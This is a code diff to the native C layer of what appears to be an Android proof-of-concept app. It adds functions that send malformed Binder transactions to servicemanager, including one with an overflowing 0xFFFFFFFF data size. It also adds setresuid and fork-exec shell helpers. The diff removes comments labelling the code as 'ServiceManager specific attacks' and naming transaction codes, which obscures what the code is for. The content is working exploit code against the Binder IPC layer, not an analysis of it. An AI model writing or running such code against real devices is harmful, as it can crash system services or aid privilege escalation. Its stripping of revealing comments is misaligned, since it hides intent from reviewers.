@@ -278,8 +278,6 @@ Java_com_example_tzpoc_MainActivity_nativeBinderSendTransaction(JNIEnv* env, jcl
     return (*env)->NewStringUTF(env, result);
 }
 
-/* ---- ServiceManager specific attacks ---- */
-
 static pid_t get_servicemanager_pid(void) {
     FILE *fp = popen("pidof servicemanager 2>/dev/null", "r");
     if (!fp) return -1;
@@ -327,7 +325,7 @@ Java_com_example_tzpoc_MainActivity_nativeSendMalformedGetService(JNIEnv* env, j
     } __attribute__((packed)) tx;
     tx.cmd = BC_TRANSACTION;
     tx.tdata.target.handle = 0;
-    tx.tdata.code = 1; // GET_SERVICE
+    tx.tdata.code = 1;
     tx.tdata.flags = 0;
     tx.tdata.data_size = 4 + name_len;
     tx.tdata.offsets_size = 0;
@@ -367,7 +365,7 @@ Java_com_example_tzpoc_MainActivity_nativeSendHugeNameAddService(JNIEnv* env, jc
     } __attribute__((packed)) tx;
     tx.cmd = BC_TRANSACTION;
     tx.tdata.target.handle = 0;
-    tx.tdata.code = 2; // ADD_SERVICE
+    tx.tdata.code = 2;
     tx.tdata.flags = 0;
     tx.tdata.data_size = 4 + name_len;
     tx.tdata.offsets_size = 0;
@@ -450,6 +448,33 @@ Java_com_example_tzpoc_MainActivity_nativeSendNullBuffer(JNIEnv* env, jclass cla
 }
 
 JNIEXPORT jint JNICALL
+Java_com_example_tzpoc_MainActivity_nativeSendIntegerOverflowGetService(JNIEnv* env, jclass clazz, jint fd) {
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 1;
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = 0xFFFFFFFF;
+    tx.tdata.offsets_size = 0;
+    tx.tdata.data.ptr.buffer = 0;
+    tx.tdata.data.ptr.offsets = 0;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = 0;
+    bwr.read_buffer = 0;
+
+    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
+    if (ret < 0) return -errno;
+    return 0;
+}
+
+JNIEXPORT jint JNICALL
 Java_com_example_tzpoc_MainActivity_nativeAddService(JNIEnv* env, jclass clazz, jint fd, jstring jname) {
     const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
     if (!name) return -1;
@@ -500,6 +525,11 @@ Java_com_example_tzpoc_MainActivity_nativeSetUid(JNIEnv* env, jclass clazz, jint
     return setuid(uid);
 }
 
+JNIEXPORT jint JNICALL
+Java_com_example_tzpoc_MainActivity_nativeSetResUid(JNIEnv* env, jclass clazz, jint uid) {
+    return setresuid(uid, uid, uid);
+}
+
 JNIEXPORT jstring JNICALL
 Java_com_example_tzpoc_MainActivity_nativeExecCommand(JNIEnv* env, jclass clazz, jstring jcmd) {
     const char *cmd = (*env)->GetStringUTFChars(env, jcmd, NULL);
@@ -519,4 +549,22 @@ Java_com_example_tzpoc_MainActivity_nativeExecCommand(JNIEnv* env, jclass clazz,
     pclose(fp);
     (*env)->ReleaseStringUTFChars(env, jcmd, cmd);
     return (*env)->NewStringUTF(env, buffer);
+}
+
+JNIEXPORT jint JNICALL
+Java_com_example_tzpoc_MainActivity_nativeForkExec(JNIEnv* env, jclass clazz, jstring jcmd) {
+    const char *cmd = (*env)->GetStringUTFChars(env, jcmd, NULL);
+    if (!cmd) return -1;
+    pid_t pid = fork();
+    if (pid == 0) {
+        execl("/system/bin/sh", "sh", "-c", cmd, NULL);
+        exit(1);
+    } else if (pid > 0) {
+        int status;
+        waitpid(pid, &status, 0);
+        (*env)->ReleaseStringUTFChars(env, jcmd, cmd);
+        return WEXITSTATUS(status);
+    }
+    (*env)->ReleaseStringUTFChars(env, jcmd, cmd);
+    return -1;
 }
